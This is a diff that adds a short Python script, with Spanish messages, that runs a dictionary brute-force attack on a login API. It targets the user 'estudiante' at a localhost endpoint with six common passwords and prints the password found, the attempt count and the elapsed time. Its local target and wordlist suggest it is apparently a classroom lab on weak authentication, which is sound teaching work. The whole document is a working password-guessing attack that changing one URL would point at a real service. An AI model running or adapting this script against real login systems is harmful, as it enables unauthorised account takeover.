@@ -1,0 +1,36 @@
+import requests
+import time
+
+URL = "http://127.0.0.1:8000/login"
+TARGET_USER = "estudiante"
+dictionary = ["123456", "admin", "password", "qwerty", "uide", "septiembre"]
+
+def perform_attack():
+    print(f"Iniciando ataque de fuerza bruta contra: {TARGET_USER} ")
+    start_time = time.time()
+    attempts = 0
+
+    for password in dictionary:
+        attempts += 1
+        payload = {"username": TARGET_USER, "password": password}
+        
+        try:
+            response = requests.post(URL, json=payload)
+            
+            if response.status_code == 200:
+                end_time = time.time()
+                print(f"[+] Exelente Contraseña encontrada: '{password}'")
+                print(f"[*] Intentos realizados: {attempts}")
+                print(f"[*] Tiempo transcurrido: {round(end_time - start_time, 4)} segundos")
+                return
+            else:
+                print(f"[-] Intento {attempts}: '{password}'  Fallido")
+        
+        except requests.exceptions.ConnectionError:
+            print("Error: Asegúrate de que la API esté corriendo.")
+            return
+
+    print("El ataque finalizó sin encontrar la contraseña ")
+
+if __name__ == "__main__":
+    perform_attack()
